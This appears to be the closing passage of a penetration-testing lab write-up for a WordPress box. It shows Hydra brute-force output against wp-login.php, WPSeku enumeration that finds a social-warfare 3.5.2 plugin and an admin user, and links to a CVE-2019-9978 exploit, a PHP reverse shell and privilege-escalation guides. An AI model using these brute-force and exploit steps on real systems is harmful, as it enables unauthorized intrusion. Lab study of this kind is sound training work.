Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2021-12-04 00:12:17
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:0), ~14344399 tries per task
[DATA] attacking http-post-form://192.168.84.123:80//wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.84.123%2Fwordpress%2Fwp-admin%2F&testcookie=1:Lost your password
[STATUS] 398.00 tries/min, 398 tries in 00:00h, 0 to do in 01:00h, 14344001 active
[STATUS] 399.67 tries/min, 1199 tries in 00:00h, 0 to do in 03:00h, 14343200 active
[STATUS] 398.43 tries/min, 2789 tries in 00:00h, 0 to do in 07:00h, 14341610 active
[STATUS] 402.87 tries/min, 6043 tries in 00:00h, 0 to do in 15:00h, 14338356 active
[STATUS] 401.71 tries/min, 12453 tries in 00:00h, 0 to do in 31:00h, 14331946 active
[STATUS] 401.64 tries/min, 18877 tries in 00:00h, 0 to do in 47:00h, 14325522 active
[STATUS] 11.41 tries/min, 24244 tries in 00:35h, 0 to do in 24:00h, 14320155 active
[STATUS] 11.55 tries/min, 24717 tries in 00:35h, 0 to do in 40:00h, 14319715 active
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
```


```console
root@kali:/OSCPv3/offsec_pg/Wpwn/WPSeku-1# python wpseku.py --target http://192.168.149.123/wordpress
__        ______  ____       _          
\ \      / /  _ \/ ___|  ___| | ___   _ 
 \ \ /\ / /| |_) \___ \ / _ \ |/ / | | |
  \ V  V / |  __/ ___) |  __/   <| |_| |
   \_/\_/  |_|   |____/ \___|_|\_\\__,_|
                                         
|| WPSeku - Wordpress Security Scanner   
|| Version 0.2.1                         
|| Momo Outaadi (M4ll0k)                 
|| https://github.com/m4ll0k/WPSeku

[+] Target: http://192.168.149.123/wordpress
[+] Starting: 05/12/2021 13:23:28


[*] Checking sitemap...
[-] sitemap.xml not available
[*] Checking license...
[+] license.txt available under: http://192.168.149.123/wordpress/license.txt
[*] Checking robots...
[*] Checking crossdomain...
[-] crossdomain.xml not available
[*] Checking readme...
[+] readme.html available under: http://192.168.149.123/wordpress/readme.html
[*] Checking .htaccess...
[-] .htaccess not available
[*] Checking xmlrpc...
[+] XML-RPC Interface available under: http://192.168.149.123/wordpress/xmlrpc.php
[*] Checking Full Path Disclosure...
[-] Full Path Disclosure not available
[*] Checking wp-config...
[-] wp-config not available
[*] Checking wp-config-sample...
[+] wp-config-sample available under: http://192.168.149.123/wordpress/wp-config-sample.php
[*] Checking wp-config backup...
[-] wp-config.php~ backup not available
[-] wp-config.backup backup not available
[-] wp-config.bck backup not available
[-] wp-config.old backup not available
[-] wp-config.save backup not available
[-] wp-config.bak backup not available
[-] wp-config.copy backup not available
[-] wp-config.tmp backup not available
[-] wp-config.txt backup not available
[-] wp-config.zip backup not available
[-] wp-config.db backup not available
[-] wp-config.dat backup not available
[-] wp-config.tar.gz backup not available
[-] wp-config.back backup not available
[-] wp-config.test backup not available
[-] wp-config.temp backup not available
[-] wp-config.orig backup not available
[*] Checking dir listing...
[-] dir /wp-admin not listing enabled
[+] dir /wp-includes listing enabled under: http://192.168.149.123/wordpress/wp-includes
[+] dir /wp-content/uploads listing enabled under: http://192.168.149.123/wordpress/wp-content/uploads
[-] dir /wp-content/plugins not listing enabled
[-] dir /wp-content/themes not listing enabled
[*] Interesting headers...

Connection: close
Content-Type: text/html; charset=UTF-8
Date: Sun, 05 Dec 2021 19:23:48 GMT
Server: Apache/2.4.38 (Debian)
Transfer-Encoding: chunked
Vary: Accept-Encoding

[*] Checking WAF...
[*] Checking wp-login protection...
[+] wp-login not detect protection
[*] Checking wordpress version...
[+] Running WordPress version: 5.5



[*] Checking WAF...
[*] Checking wp-login protection...
[+] wp-login not detect protection
[*] Checking wordpress version...
[+] Running WordPress version: 5.5

[*] Enumeration themes...

 | Name: twentytwenty
 | Theme Name: Twenty
 | Theme URL: https://wordpress.org/themes/twentytwenty/
 | Author: the
 | Author URL: https://wordpress.org/
 | Version: 1.5
 | Style: http://192.168.149.123/wordpress/wp-content/themes/twentytwenty/style.css
 | Listing: http://192.168.149.123/wordpress/wp-content/themes/twentytwenty/inc
 | Listing: http://192.168.149.123/wordpress/wp-content/themes/twentytwenty/assets
 | Not found vulnerabilities

[*] Enumeration plugins...

 | Name: social-warfare - 3.5.2
 | Readme: http://192.168.149.123/wordpress/wp-content/plugins/social-warfare/readme.txt
 | Readme: http://192.168.149.123/wordpress/wp-content/plugins/social-warfare/README.md
 | Not found vulnerabilities

[*] Enumeration usernames...
 |  ID: 0  |  Login: admin
 |  ID: 1  |  Login: admin
```


https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh

https://github.com/DominicBreuker/pspy

https://github.com/hash3liZer/CVE-2019-9978

https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

https://book.hacktricks.xyz/shells/shells/msfvenom

https://materials.rangeforce.com/tutorial/2020/02/19/Linux-PrivEsc-Capabilities/

https://catonmat.net/tcp-port-scanner-in-bash

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md

https://gtfobins.github.io/

https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm

https://github.com/NoorQureshi/WPSeku-1

https://book.hacktricks.xyz/brute-force

https://www.einstijn.com/penetration-testing/website-username-password-brute-forcing-with-hydra/

https://chryzsh.gitbooks.io/pentestbook/content/local_file_inclusion.html

https://www.hackingarticles.in/apache-log-poisoning-through-lfi/
